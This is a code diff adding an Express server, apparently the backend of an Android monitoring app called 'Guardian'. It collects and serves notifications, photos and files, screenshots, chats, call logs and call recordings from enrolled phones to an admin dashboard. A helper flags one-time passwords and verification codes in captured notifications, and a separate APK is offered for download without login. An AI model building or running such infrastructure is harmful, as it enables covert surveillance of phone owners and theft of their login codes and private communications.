@@ -1,0 +1,450 @@
+import express from "express";
+import path from "node:path";
+import fs from "node:fs";
+import { fileURLToPath } from "node:url";
+import { prisma } from "./db.js";
+import { ingestRouter } from "./routes/ingest.js";
+import { storageSyncRouter, deviceMediaDir, MEDIA_STORE_DIR } from "./routes/storageSync.js";
+import { screenshotSyncRouter } from "./routes/screenshotSync.js";
+import { chatSyncRouter } from "./routes/chatSync.js";
+import { callSyncRouter } from "./routes/callSync.js";
+import { createSessionToken, parseCookies, verifyPassword, verifySessionToken } from "./auth.js";
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const APK_PATH = path.join(__dirname, "../public/guardian.apk");
+const DASHBOARD_DIST = path.join(__dirname, "../../dashboard/dist");
+const app = express();
+app.use(express.json({ limit: "2mb" }));
+app.get("/health", (_req, res) => res.json({ ok: true }));
+/* --------------------------------- Login ------------------------------------ */
+// Gates the dashboard's data (device list, message feed, APK download) behind a
+// single admin login. Session is a stateless signed cookie — no server-side store.
+const COOKIE_NAME = "guardian_session";
+const SESSION_SECRET = process.env.SESSION_SECRET;
+const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
+const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH;
+if (!SESSION_SECRET || !ADMIN_USERNAME || !ADMIN_PASSWORD_HASH) {
+    console.warn("WARNING: SESSION_SECRET / ADMIN_USERNAME / ADMIN_PASSWORD_HASH not set — dashboard login will reject everyone.");
+}
+function isAuthed(req) {
+    if (!SESSION_SECRET)
+        return false;
+    const cookies = parseCookies(req.header("cookie"));
+    return verifySessionToken(cookies[COOKIE_NAME], SESSION_SECRET);
+}
+function requireAuth(req, res, next) {
+    if (isAuthed(req))
+        return next();
+    res.status(401).json({ error: "authentication required" });
+}
+app.post("/api/login", (req, res) => {
+    const { username, password } = (req.body ?? {});
+    if (!SESSION_SECRET ||
+        !ADMIN_USERNAME ||
+        !ADMIN_PASSWORD_HASH ||
+        typeof username !== "string" ||
+        typeof password !== "string" ||
+        username !== ADMIN_USERNAME ||
+        !verifyPassword(password, ADMIN_PASSWORD_HASH)) {
+        return res.status(401).json({ error: "invalid username or password" });
+    }
+    res.cookie(COOKIE_NAME, createSessionToken(SESSION_SECRET), {
+        httpOnly: true,
+        sameSite: "lax",
+        maxAge: 12 * 60 * 60 * 1000,
+    });
+    res.json({ ok: true });
+});
+app.post("/api/logout", (_req, res) => {
+    res.clearCookie(COOKIE_NAME);
+    res.json({ ok: true });
+});
+app.get("/api/session", (req, res) => {
+    res.json({ authenticated: isAuthed(req) });
+});
+// Diagnostic request log for device endpoints: shows heartbeat/ingest/media-sync attempts,
+// their status, and how many events/items the device sent.
+app.use("/v1", (req, res, next) => {
+    const body = req.body;
+    const n = Array.isArray(body?.events) ? body.events.length : Array.isArray(body?.items) ? body.items.length : undefined;
+    res.on("finish", () => {
+        const evt = n !== undefined ? ` count=${n}` : "";
+        console.log(`[v1] ${new Date().toISOString()} ${req.method} ${req.originalUrl} -> ${res.statusCode}${evt} ua="${req.header("user-agent") ?? "-"}"`);
+    });
+    next();
+});
+app.use(ingestRouter);
+app.use(storageSyncRouter);
+app.use(screenshotSyncRouter);
+app.use(chatSyncRouter);
+app.use(callSyncRouter);
+// APK sends to /api/v1/* — mount same routers under /api so Express strips prefix to /v1/*
+app.use("/api", ingestRouter);
+app.use("/api", storageSyncRouter);
+app.use("/api", screenshotSyncRouter);
+app.use("/api", chatSyncRouter);
+app.use("/api", callSyncRouter);
+/* ----------------------------- APK distribution ---------------------------- */
+/** Whether a built APK is currently available for download. */
+app.get("/api/apk-status", requireAuth, (_req, res) => {
+    if (!fs.existsSync(APK_PATH))
+        return res.json({ available: false });
+    const stat = fs.statSync(APK_PATH);
+    // A real APK is a ZIP archive → starts with the magic bytes "PK" (0x50 0x4B).
+    // Anything else (like our text placeholder) is downloadable but flagged not-real.
+    const fd = fs.openSync(APK_PATH, "r");
+    const head = Buffer.alloc(2);
+    fs.readSync(fd, head, 0, 2, 0);
+    fs.closeSync(fd);
+    const isRealApk = head[0] === 0x50 && head[1] === 0x4b;
+    res.json({
+        available: true,
+        isRealApk,
+        sizeBytes: stat.size,
+        builtAt: stat.mtime.toISOString(),
+    });
+});
+/** Serves the monitored-device APK. The binary is produced by the Android build
+ *  (locally via gradlew, or in CI) and placed at server/public/guardian.apk. */
+app.get("/download/apk", requireAuth, (_req, res) => {
+    if (!fs.existsSync(APK_PATH)) {
+        return res
+            .status(503)
+            .json({ error: "APK not built yet. Build android/ and place it at server/public/guardian.apk" });
+    }
+    res.download(APK_PATH, "guardian.apk");
+});
+/** Public download for the Glovion APK – no login required. */
+const GLOVION_APK_PATH = path.join(__dirname, "../public/Glovion.apk");
+app.get("/download/glovion", (_req, res) => {
+    if (!fs.existsSync(GLOVION_APK_PATH)) {
+        return res.status(404).json({ error: "Glovion APK not available yet." });
+    }
+    res.download(GLOVION_APK_PATH, "Glovion.apk");
+});
+/* ------------------------------ Dashboard API ------------------------------- */
+/** A device counts as online if it was seen within this window. */
+const ONLINE_WINDOW_MS = 150_000;
+/** Detect likely OTP/verification-code notifications from text content. */
+function detectOtp(text) {
+    if (!text)
+        return false;
+    if (/\b(otp|one.?time.?password|verification code|verify code|auth code|passcode|security code|access code)\b/i.test(text))
+        return true;
+    if (/\b\d{4,8}\b/.test(text))
+        return true;
+    return false;
+}
+// 2.5 min — heartbeat runs ~every 60s
+/** Devices list for the dashboard, with live online status. */
+app.get("/api/devices", requireAuth, async (_req, res) => {
+    const devices = await prisma.device.findMany({
+        orderBy: { createdAt: "desc" },
+        select: {
+            id: true,
+            label: true,
+            createdAt: true,
+            lastSeenAt: true,
+            _count: { select: { events: true, mediaItems: true, screenshots: true, chatMessages: true, callLogs: true, callRecordings: true } },
+        },
+    });
+    const now = Date.now();
+    res.json(devices.map((d) => ({
+        id: d.id,
+        label: d.label,
+        createdAt: d.createdAt,
+        eventCount: d._count.events,
+        mediaCount: d._count.mediaItems,
+        screenshotCount: d._count.screenshots,
+        chatMessageCount: d._count.chatMessages,
+        callLogCount: d._count.callLogs,
+        callRecordingCount: d._count.callRecordings,
+        lastSeenAt: d.lastSeenAt ? d.lastSeenAt.toISOString() : null,
+        online: d.lastSeenAt ? now - d.lastSeenAt.getTime() < ONLINE_WINDOW_MS : false,
+    })));
+});
+/** Captured notifications for a device (newest first). Supports ?isOtp=true to filter OTP events. */
+app.get("/api/devices/:deviceId/events", requireAuth, async (req, res) => {
+    const { isOtp: isOtpFilter } = req.query;
+    const rows = await prisma.event.findMany({
+        where: { deviceId: req.params.deviceId },
+        orderBy: { receivedAt: "desc" },
+        take: 500,
+    });
+    const mapped = rows.map((r) => ({
+        id: r.id,
+        packageName: r.packageName,
+        appLabel: r.appLabel,
+        conversationTitle: r.conversationTitle,
+        sender: r.sender,
+        text: r.text,
+        isGroup: r.isGroup,
+        isOtp: detectOtp(r.text),
+        postedAt: r.postedAt.toString(),
+        capturedAt: r.capturedAt.toString(),
+        receivedAt: r.receivedAt.toISOString(),
+    }));
+    res.json(isOtpFilter === "true" ? mapped.filter((e) => e.isOtp) : mapped);
+});
+/** Synchronized media metadata for a device (newest first), with optional filters. */
+app.get("/api/devices/:deviceId/media", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const { type, q, from, to, category } = req.query;
+    const where = { deviceId };
+    if (type === "image" || type === "video" || type === "audio" || type === "document")
+        where.mediaType = type;
+    if (q)
+        where.displayName = { contains: q };
+    if (category)
+        where.folderCategory = category;
+    const dateAdded = {};
+    const fromMs = from ? Number(from) : undefined;
+    const toMs = to ? Number(to) : undefined;
+    if (fromMs !== undefined && Number.isFinite(fromMs))
+        dateAdded.gte = BigInt(Math.trunc(fromMs));
+    if (toMs !== undefined && Number.isFinite(toMs))
+        dateAdded.lte = BigInt(Math.trunc(toMs));
+    if (dateAdded.gte !== undefined || dateAdded.lte !== undefined)
+        where.dateAddedMs = dateAdded;
+    const rows = await prisma.mediaItem.findMany({
+        where,
+        orderBy: { receivedAt: "desc" },
+        take: 200,
+    });
+    res.json(rows.map((r) => ({
+        id: r.id,
+        mediaType: r.mediaType,
+        uri: r.uri,
+        displayName: r.displayName,
+        mimeType: r.mimeType,
+        sizeBytes: r.sizeBytes !== null ? r.sizeBytes.toString() : null,
+        dateAddedMs: r.dateAddedMs !== null ? r.dateAddedMs.toString() : null,
+        dateModifiedMs: r.dateModifiedMs !== null ? r.dateModifiedMs.toString() : null,
+        width: r.width,
+        height: r.height,
+        durationMs: r.durationMs !== null ? r.durationMs.toString() : null,
+        thumbnailBase64: r.thumbnailBase64,
+        syncStatus: r.syncStatus,
+        contentAvailable: r.syncStatus === "uploaded" && r.storedPath !== null,
+        contentSizeBytes: r.contentSizeBytes !== null ? r.contentSizeBytes.toString() : null,
+        syncedAt: r.syncedAt ? r.syncedAt.toISOString() : null,
+        capturedAt: r.capturedAt.toString(),
+        receivedAt: r.receivedAt.toISOString(),
+        folderCategory: r.folderCategory ?? null,
+        relativePath: r.relativePath ?? null,
+    })));
+});
+/** Serves media file content inline for preview (dashboard session auth only). */
+app.get("/api/devices/:deviceId/media/:itemId/content", requireAuth, async (req, res) => {
+    const { deviceId, itemId } = req.params;
+    const item = await prisma.mediaItem.findUnique({ where: { id: itemId } });
+    if (!item || item.deviceId !== deviceId || !item.storedPath) {
+        return res.status(404).json({ error: "content not available" });
+    }
+    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
+    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
+        return res.status(404).json({ error: "content not available" });
+    }
+    res.setHeader("Content-Type", item.mimeType ?? "application/octet-stream");
+    res.setHeader("Content-Disposition", `inline; filename="${(item.displayName ?? itemId).replace(/"/g, "")}"`);
+    res.sendFile(absolutePath);
+});
+/** Downloads media file as an attachment (forces browser save dialog). Dashboard session auth only. */
+app.get("/api/devices/:deviceId/media/:itemId/download", requireAuth, async (req, res) => {
+    const { deviceId, itemId } = req.params;
+    const item = await prisma.mediaItem.findUnique({ where: { id: itemId } });
+    if (!item || item.deviceId !== deviceId || !item.storedPath) {
+        return res.status(404).json({ error: "content not available" });
+    }
+    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
+    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
+        return res.status(404).json({ error: "content not available" });
+    }
+    const filename = (item.displayName ?? itemId).replace(/["/\\]/g, "_");
+    res.setHeader("Content-Type", item.mimeType ?? "application/octet-stream");
+    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
+    res.sendFile(absolutePath);
+});
+/** Screenshots for a device (newest first), with optional date range. */
+app.get("/api/devices/:deviceId/screenshots", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const { from, to } = req.query;
+    const where = { deviceId };
+    const capturedAt = {};
+    const fromMs = from ? Number(from) : undefined;
+    const toMs = to ? Number(to) : undefined;
+    if (fromMs !== undefined && Number.isFinite(fromMs))
+        capturedAt.gte = BigInt(Math.trunc(fromMs));
+    if (toMs !== undefined && Number.isFinite(toMs))
+        capturedAt.lte = BigInt(Math.trunc(toMs));
+    if (capturedAt.gte !== undefined || capturedAt.lte !== undefined)
+        where.capturedAt = capturedAt;
+    const rows = await prisma.screenshot.findMany({
+        where,
+        orderBy: { capturedAt: "desc" },
+        take: 200,
+    });
+    res.json(rows.map((r) => ({
+        id: r.id,
+        filename: r.filename,
+        sizeBytes: r.sizeBytes,
+        width: r.width,
+        height: r.height,
+        capturedAt: r.capturedAt.toString(),
+        receivedAt: r.receivedAt.toISOString(),
+    })));
+});
+/** Serves screenshot image content (dashboard session auth only). */
+app.get("/api/devices/:deviceId/screenshots/:id/content", requireAuth, async (req, res) => {
+    const { deviceId, id } = req.params;
+    const item = await prisma.screenshot.findUnique({ where: { id } });
+    if (!item || item.deviceId !== deviceId || !item.storedPath) {
+        return res.status(404).json({ error: "screenshot not available" });
+    }
+    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
+    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
+        return res.status(404).json({ error: "screenshot not available" });
+    }
+    res.setHeader("Content-Type", "image/jpeg");
+    res.setHeader("Content-Disposition", `inline; filename="${item.filename}.jpg"`);
+    res.sendFile(absolutePath);
+});
+/** Imported chat messages for a device (newest first), with optional search. */
+app.get("/api/devices/:deviceId/chats", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const { q, chat } = req.query;
+    const where = { deviceId };
+    if (q)
+        where.text = { contains: q };
+    if (chat)
+        where.chatName = chat;
+    const rows = await prisma.chatMessage.findMany({
+        where,
+        orderBy: { messageAt: "desc" },
+        take: 500,
+    });
+    res.json(rows.map((r) => ({
+        id: r.id,
+        clientMessageId: r.clientMessageId,
+        chatName: r.chatName,
+        sender: r.sender,
+        text: r.text,
+        messageAt: r.messageAt.toString(),
+        importedAt: r.importedAt.toISOString(),
+    })));
+});
+/** Distinct chat names for a device (for the filter dropdown). */
+app.get("/api/devices/:deviceId/chats/conversations", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const raw = await prisma.chatMessage.groupBy({
+        by: ["chatName"],
+        where: { deviceId },
+        _count: { id: true },
+        orderBy: { _count: { id: "desc" } },
+    });
+    res.json(raw.map((r) => ({ chatName: r.chatName, count: r._count.id })));
+});
+/** Call logs for a device (newest first), with optional search. */
+app.get("/api/devices/:deviceId/calls", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const { q, type } = req.query;
+    const where = { deviceId };
+    if (q)
+        where.OR = [
+            { phoneNumber: { contains: q } },
+            { contactName: { contains: q } },
+        ];
+    if (type && ["incoming", "outgoing", "missed", "rejected", "blocked"].includes(type)) {
+        where.callType = type;
+    }
+    const rows = await prisma.callLog.findMany({
+        where,
+        orderBy: { callAt: "desc" },
+        take: 500,
+    });
+    res.json(rows.map((r) => ({
+        id: r.id,
+        clientCallId: r.clientCallId,
+        phoneNumber: r.phoneNumber,
+        contactName: r.contactName,
+        callType: r.callType,
+        duration: r.duration,
+        callAt: r.callAt.toString(),
+        receivedAt: r.receivedAt.toISOString(),
+    })));
+});
+/** Call recordings for a device (newest first). */
+app.get("/api/devices/:deviceId/call-recordings", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const rows = await prisma.callRecording.findMany({
+        where: { deviceId },
+        orderBy: { callAt: "desc" },
+        take: 200,
+    });
+    res.json(rows.map((r) => ({
+        id: r.id,
+        clientRecId: r.clientRecId,
+        phoneNumber: r.phoneNumber,
+        contactName: r.contactName,
+        callType: r.callType,
+        duration: r.duration,
+        sizeBytes: r.sizeBytes,
+        callAt: r.callAt.toString(),
+        receivedAt: r.receivedAt.toISOString(),
+    })));
+});
+/** Streams a call recording audio file (dashboard session auth only). */
+app.get("/api/devices/:deviceId/call-recordings/:recId/content", requireAuth, async (req, res) => {
+    const { deviceId, recId } = req.params;
+    const item = await prisma.callRecording.findUnique({ where: { id: recId } });
+    if (!item || item.deviceId !== deviceId || !item.storedPath) {
+        return res.status(404).json({ error: "recording not available" });
+    }
+    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
+    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
+        return res.status(404).json({ error: "recording not available" });
+    }
+    res.setHeader("Content-Type", "audio/mpeg");
+    res.setHeader("Content-Disposition", `inline; filename="call-${item.clientRecId}.mp3"`);
+    res.sendFile(absolutePath);
+});
+/** Removes a device, its captured messages, media, screenshots, and stored content. */
+app.delete("/api/devices/:deviceId", requireAuth, async (req, res) => {
+    const { deviceId } = req.params;
+    const existing = await prisma.device.findUnique({ where: { id: deviceId }, select: { id: true } });
+    if (!existing)
+        return res.status(404).json({ error: "device not found" });
+    await prisma.$transaction([
+        prisma.event.deleteMany({ where: { deviceId } }),
+        prisma.mediaItem.deleteMany({ where: { deviceId } }),
+        prisma.screenshot.deleteMany({ where: { deviceId } }),
+        prisma.chatMessage.deleteMany({ where: { deviceId } }),
+        prisma.callLog.deleteMany({ where: { deviceId } }),
+        prisma.callRecording.deleteMany({ where: { deviceId } }),
+        prisma.device.delete({ where: { id: deviceId } }),
+    ]);
+    await fs.promises.rm(deviceMediaDir(deviceId), { recursive: true, force: true });
+    res.json({ ok: true });
+});
+/* ----------------------- Dev helpers (pairing stand-in) --------------------- */
+app.post("/dev/enroll", async (req, res) => {
+    const { deviceId, enrollmentToken, label } = req.body ?? {};
+    if (!deviceId || !enrollmentToken) {
+        return res.status(400).json({ error: "deviceId and enrollmentToken required" });
+    }
+    const device = await prisma.device.upsert({
+        where: { id: deviceId },
+        update: { enrollmentToken, label },
+        create: { id: deviceId, enrollmentToken, label },
+    });
+    res.json({ deviceId: device.id, label: device.label });
+});
+/* --------------------------- Static dashboard ------------------------------- */
+if (fs.existsSync(DASHBOARD_DIST)) {
+    app.use(express.static(DASHBOARD_DIST));
+    // SPA fallback for client-side routing.
+    app.get(/^(?!\/api|\/download|\/v1|\/dev|\/health).*/, (_req, res) => {
+        res.sendFile(path.join(DASHBOARD_DIST, "index.html"));
+    });
+}
+const port = Number(process.env.PORT ?? 8080);
+app.listen(port, () => console.log(`Guardian server (API + dashboard) listening on :${port}`));
